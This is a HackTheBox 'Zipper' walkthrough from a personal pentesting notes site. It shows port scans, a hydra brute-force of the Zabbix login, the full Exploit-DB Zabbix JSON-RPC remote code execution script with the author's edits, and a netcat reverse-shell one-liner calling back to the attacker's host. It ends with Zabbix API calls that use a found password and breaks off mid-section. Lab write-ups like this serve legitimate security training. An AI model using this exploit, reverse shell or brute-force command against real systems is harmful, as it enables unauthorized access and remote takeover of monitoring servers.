@@ -1,0 +1,1224 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>DocDock Documentation</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-02-23T14:11:03 EST">
+<title>Zipper :: DocDock Documentation</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/zipper/zipper/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="chickenpwny">ChickenPwny</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/chickenpwny"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/zipper/">Zipper</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/zipper/zipper/" class="dd-item active">
+    <div>
+        <a href="/hackthebox/boxes/zipper/zipper/">
+            Zipper
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/hackthebox/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/help/" class="dd-item
+        ">
+    <div>
+
+        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/bloodhound/" class="dd-item">
+    <div>
+        <a href="/tools/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ftp/" class="dd-item">
+    <div>
+        <a href="/tools/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/hydra/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/smb/smb/" class="dd-item">
+    <div>
+        <a href="/tools/smb/smb/">
+            SMB
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/snmpwalk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/webapp/burp/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option> 
+      <option value="/hackthebox/boxes/zipper/zipper/"  selected>--- Zipper</option>
+  
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
+    <option value="/help/" >
+   Network Manager Down</option>
+    <option value="/tools/" >
+   Tools</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>Zipper</h1>
+    
+    
+    
+    
+
+<p>NMAP</p>
+
+<p>initial</p>
+
+<pre><code># Nmap 7.70 scan initiated Fri Feb 15 14:32:38 2019 as: nmap -sC -sV -oA nmap/intial -T4 10.10.10.108
+Nmap scan report for 10.10.10.108
+Host is up (0.046s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
+|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
+|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Feb 15 14:32:49 2019 -- 1 IP address (1 host up) scanned in 10.44 seconds
+
+</code></pre>
+
+<p>TOTAL</p>
+
+<pre><code>nmap -T3 -Pn -p- -oA total 10.10.10.108                                                       
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 14:43 EST
+Nmap scan report for 10.10.10.108
+Host is up (0.048s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+10050/tcp open  zabbix-agent
+</code></pre>
+
+<p>UDP</p>
+
+<p>GOBUSTER  &ndash;10.10.10.108</p>
+
+<pre><code>gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.108                             
+</code></pre>
+
+<pre><code>/zabbix (Status: 301)
+</code></pre>
+
+<pre><code>/images (Status: 301)
+/img (Status: 301)
+/audio (Status: 301)
+/local (Status: 403)
+/app (Status: 403)
+/js (Status: 301)
+/include (Status: 403)
+/conf (Status: 403)
+/styles (Status: 301)
+/fonts (Status: 301)
+/locale (Status: 301)
+</code></pre>
+
+<p>had some errors enuemrating local sinces its 403 force wildcards and then had to remove 404</p>
+
+<pre><code>gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.108/zabbix/local -fw -s &quot;200,204,301,302,307&quot;
+</code></pre>
+
+<p>SEARCHSPLOIT        /usr/share/exploitdb/</p>
+
+<pre><code>Zabbix - (Authenticated) Remote Command Execution (Metasploit)      | exploits/linux/remote/29321.rb         
+Zabbix 2.0 &lt; 3.0.3 - SQL Injection                                 | exploits/php/webapps/40353.py  Zabbix 2.0.1 - Session Extractor    X                               | exploits/php/webapps/20087.py 
+Zabbix 2.0.5 - Cleartext ldap_bind_Password Password Disclosure (Me | exploits/php/webapps/36157.rb 
+Zabbix 2.0.8 - SQL Injection / Remote Code Execution (Metasploit)   | xploits/unix/webapps/28972.rb 
+Zabbix 2.2 &lt; 3.0.3 - API JSON-RPC Remote Code Execution    X       | exploits/php/webapps/39937.py 
+Zabbix 2.2.x/3.0.x - SQL Injection                                 | xploits/php/webapps/40237.txt 
+Zabbix Agent - 'net.tcp.listen' Command Injection (Metasploit)  | exploits/freebsd/remote/16918.rb 
+Zabbix Agent 3.0.1 - 'mysql.size' Shell Command Injection      | exploits/linux/local/39769.txt     
+Zabbix Agent &lt; 1.6.7 - Remote Bypass                        | exploits/multiple/webapps/10431.txt   
+Zabbix Server - Arbitrary Command Execution (Metasploit)       | exploits/linux/remote/20796.rb     
+Zabbix Server - Multiple Vulnerabilities                            | exploits/multiple/webapps/10432.txt   
+
+</code></pre>
+
+<p>WEBAPP</p>
+
+<p><img src="web-app.PNG" alt="web-app" /></p>
+
+<p><img src="web-version.PNG" alt="web-version" /></p>
+
+<p>So apartently getting a users credentials isn&rsquo;t nessisary to get what i need but i dont have creds but i have access to guest account which will give me access to whatever is need to get rce.</p>
+
+<p><a href="http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.106180">http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.106180</a></p>
+
+<p>SQL INHJECTION</p>
+
+<p>testing parameters</p>
+
+<p>tried testing latest,oho oaram toggle_ids for sql injection nothing returned, but burp did hang which is very very odd.</p>
+
+<p>searchsploit python binary 39937.py returns none. i had errors playing around with the sql part in burp. I believe this is protected. since guest login is enabled removing the login parts was nessisary as the login part isn&rsquo;t nessisary.</p>
+
+<pre><code>import requests
+import json
+import readline
+
+
+</code></pre>
+
+<p>BURP<img src="sql-fail'.PNG" alt="sql-fail'" /></p>
+
+<p>HYDRA</p>
+
+<p>Hydra seems a little tricky tried some short password list to no avail but might have been using the wrong post request parameters.</p>
+
+<pre><code>hydra 10.10.10.108 -L /home/htb/wordlist/seclist/Usernames/top-usernames-shortlist.txt -P /home/htb/wordlist/seclist/Passwords/Common-Credentials/10-million-password-list-top-10000.txt http-form-post &quot;/zabbix/index.php:name=^USER^&amp;password=^PASS^&amp;autologin=1&amp;enter=Sign+in:Login name or password is incorrect.&quot; 
+</code></pre>
+
+<p>Sucess</p>
+
+<pre><code>hydra 10.10.10.108 -L users -P /home/htb
+/wordlist/seclist/Passwords/Common-Credentials/10-million-password-list-top-10000.txt http-
+form-post &quot;/zabbix/index.php:name=^USER^&amp;password=^PASS^&amp;autologin=1&amp;enter=Sign+in:Login na
+me or password is incorrect.&quot; -I
+</code></pre>
+
+<p><img src="zipper-zapper.PNG" alt="zipper-zapper" /></p>
+
+<p>Reviewing 33937.py</p>
+
+<p><a href="https://www.exploit-db.com/exploits/39937">https://www.exploit-db.com/exploits/39937</a></p>
+
+<p>pretty straight forward but some parts of it are broken or didn&rsquo;t work because the code return none but thats put in and i dont know what to change it to. Moving forward just have to remove those elements form the binary and add print cmd_exec/</p>
+
+<p>DO NOT COPY PASTA EDIT YOUR SELF.</p>
+
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+# Exploit Title: Zabbix RCE with API JSON-RPC
+# Date: 06-06-2016
+# Exploit Author: Alexander Gurin
+# Vendor Homepage: http://www.zabbix.com
+# Software Link: http://www.zabbix.com/download.php
+# Version: 2.2 - 3.0.3
+# Tested on: Linux (Debian, CentOS)
+# CVE : N/A
+
+import requests
+import json
+import readline
+
+ZABIX_ROOT = 'http://192.168.66.2'	### Zabbix IP-address
+url = ZABIX_ROOT + '/api_jsonrpc.php'	### Don't edit
+
+login = 'Admin'		### Zabbix login
+password = 'zabbix'	### Zabbix password
+hostid = '10084'	### Zabbix hostid
+
+### auth
+payload = {
+   	&quot;jsonrpc&quot; : &quot;2.0&quot;,
+    &quot;method&quot; : &quot;user.login&quot;,
+    &quot;params&quot;: {
+    	'user': &quot;&quot;+login+&quot;&quot;,
+    	'password': &quot;&quot;+password+&quot;&quot;,
+    },
+###################
+#   	&quot;auth&quot; : None,
+    &quot;id&quot; : 0,
+}
+headers = {
+    'content-type': 'application/json',
+}
+
+auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
+auth = auth.json()
+
+while True:
+	cmd = raw_input('\033[41m[zabbix_cmd]&gt;&gt;: \033[0m ')
+	if cmd == &quot;&quot; : print &quot;Result of last command:&quot;
+	if cmd == &quot;quit&quot; : break
+###############################
+### update
+	payload = {
+		&quot;jsonrpc&quot;: &quot;2.0&quot;,
+		&quot;method&quot;: &quot;script.update&quot;,
+		&quot;params&quot;: {
+		    &quot;scriptid&quot;: &quot;1&quot;,
+		    &quot;command&quot;: &quot;&quot;+cmd+&quot;&quot;
+		},
+####################################
+#		&quot;auth&quot; : auth['result'],
+		&quot;id&quot; : 0,
+	}
+
+	cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
+########################
+### execute
+	payload = {
+		&quot;jsonrpc&quot;: &quot;2.0&quot;,
+		&quot;method&quot;: &quot;script.execute&quot;,
+		&quot;params&quot;: {
+		    &quot;scriptid&quot;: &quot;1&quot;,
+		    &quot;hostid&quot;: &quot;&quot;+hostid+&quot;&quot;
+		},
+################################
+#		&quot;auth&quot; : auth['result'],
+		&quot;id&quot; : 0,
+	}
+
+	cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
+	cmd_exe = cmd_exe.json()
+	###################################
+#	print cmd_exe[&quot;result&quot;][&quot;value&quot;]
+	print cmd_exe
+</code></pre>
+
+<pre><code>while True:
+###########################################
+	cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 9017 &gt;/tmp/f')
+######################################3####
+	if cmd == &quot;&quot; : print &quot;Result of last command:&quot;
+	if cmd == &quot;quit&quot; : break
+</code></pre>
+
+<p><img src="edit-poc-rce-shell.PNG" alt="edit-poc-rce-shell" /></p>
+
+<p><img src="ping-zabbix-rce.PNG" alt="ping-zabbix-rce" /></p>
+
+<p>To get a reverse shell i just used</p>
+
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 7001 &gt;/tmp/f
+nc -lvnp 7001
+</code></pre>
+
+<p>End up in a stricted shell can&rsquo;t run python i checked the paths</p>
+
+<pre><code>/usr/bin/python, 2.7, 2, 3,
+</code></pre>
+
+<p>Os =version</p>
+
+<pre><code>VERSION_ID=&quot;18.04&quot;     
+[-] Hostname:da419a43ab60
+eth0:                                 
+        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255                             
+        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
+        
+tcp        0      0 172.17.0.2:80
+
+</code></pre>
+
+<p>DOCKER</p>
+
+<pre><code>[+] Looks like we're in a Docker container:
+12:perf_event:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+11:net_cls,net_prio:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+10:pids:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+9:cpuset:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+8:freezer:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+7:hugetlb:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+5:blkio:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+4:memory:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+3:cpu,cpuacct:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+2:devices:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+1:name=systemd:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8
+0::/system.slice/docker.service
+-rwxr-xr-x 1 root root 0 Feb 19 11:14 /.dockerenv
+</code></pre>
+
+<p>There are multiple connection to 172.17.0.2</p>
+
+<pre><code>$ for ip in $(seq 1 254); do
+nc -zv -w 1 172.17.0.$ip 22 2&gt;&amp;1 &gt; /tmp/nul | grep -v 'Host name lookup'|grep -v 'Connection timed out' &amp;
+done&gt; &gt;
+da419a43ab60 [172.17.0.2] 22 (ssh) : Connection refused
+</code></pre>
+
+<p>aparently im in the wrong place back to zabbix lol</p>
+
+<p>tried logging into mysql as zabbix</p>
+
+<pre><code>mysql -u Zapper -p
+Enter password: zapper
+ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password: YES)
+</code></pre>
+
+<h1 id="user-information">USER INFORMATION</h1>
+
+<p>USER.CHECKAUTHENTICATION    <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/user/login">https://www.zabbix.com/documentation/3.0/manual/api/reference/user/login</a></p>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.checkAuthentication&quot;, &quot;params&quot; : {&quot;sessionid&quot; : &quot;fe104ec22e55d13c8e86cb66c93dc6f6&quot;} , &quot;id&quot;: 1}
+</code></pre>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.login&quot;, &quot;params&quot;: {&quot;user&quot;:&quot;Zapper&quot;,&quot;password&quot;:&quot;zapper&quot;, &quot;userData&quot;:true},&quot;id&quot;: 1}
+</code></pre>
+
+<p><img src="api-login2.PNG" alt="api-login2" /></p>
+
+<p>USER.GET</p>
+
+<p><a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/user/get">https://www.zabbix.com/documentation/3.0/manual/api/reference/user/get</a></p>
+
+<pre><code>{&quot;userid&quot;:&quot;1&quot;,&quot;alias&quot;:&quot;Admin&quot;,&quot;name&quot;:&quot;Zabbix&quot;,&quot;surname&quot;:&quot;Administrator&quot;,&quot;url&quot;:&quot;&quot;,&quot;autologin&quot;:&quot;1&quot;,&quot;autologout&quot;:&quot;0&quot;,&quot;lang&quot;:&quot;en_GB&quot;,&quot;refresh&quot;:&quot;30&quot;,&quot;type&quot;:&quot;3&quot;,&quot;theme&quot;:&quot;default&quot;,&quot;attempt_failed&quot;:&quot;0&quot;,&quot;attempt_ip&quot;:&quot;&quot;,&quot;attempt_clock&quot;:&quot;0&quot;,&quot;rows_per_page&quot;:&quot;50&quot;},
+##################################################################{&quot;userid&quot;:&quot;2&quot;,&quot;alias&quot;:&quot;guest&quot;,&quot;name&quot;:&quot;&quot;,&quot;surname&quot;:&quot;&quot;,&quot;url&quot;:&quot;&quot;,&quot;autologin&quot;:&quot;1&quot;,&quot;autologout&quot;:&quot;0&quot;,&quot;lang&quot;:&quot;en_GB&quot;,&quot;refresh&quot;:&quot;30&quot;,&quot;type&quot;:&quot;1&quot;,&quot;theme&quot;:&quot;default&quot;,&quot;attempt_failed&quot;:&quot;0&quot;,&quot;attempt_ip&quot;:&quot;&quot;,&quot;attempt_clock&quot;:&quot;0&quot;,&quot;rows_per_page&quot;:&quot;50&quot;},
+##################################################################{&quot;userid&quot;:&quot;3&quot;,&quot;alias&quot;:&quot;Zapper&quot;,&quot;name&quot;:&quot;chicken&quot;,&quot;surname&quot;:&quot;&quot;,&quot;url&quot;:&quot;&quot;,&quot;autologin&quot;:&quot;0&quot;,&quot;autologout&quot;:&quot;0&quot;,&quot;lang&quot;:&quot;en_GB&quot;,&quot;refresh&quot;:&quot;30&quot;,&quot;type&quot;:&quot;3&quot;,&quot;theme&quot;:&quot;default&quot;,&quot;attempt_failed&quot;:&quot;0&quot;,&quot;attempt_ip&quot;:&quot;&quot;,&quot;attempt_clock&quot;:&quot;0&quot;,&quot;rows_per_page&quot;:&quot;50&quot;
+</code></pre>
+
+<pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot; : {&quot;output&quot;:&quot;extend&quot;}, &quot;auth&quot;:&quot;cf59b1d9c2addcf06b7630b3730e3d8c&quot;, &quot;id&quot;: 1}
+</code></pre>
+
+<p><img src="api-login-user-get.PNG" alt="api-login-user-get" /></p>
+
+<p>UPDATE SCRIPT</p>
+
+<p>this little bit will add the script and give it an id</p>
+
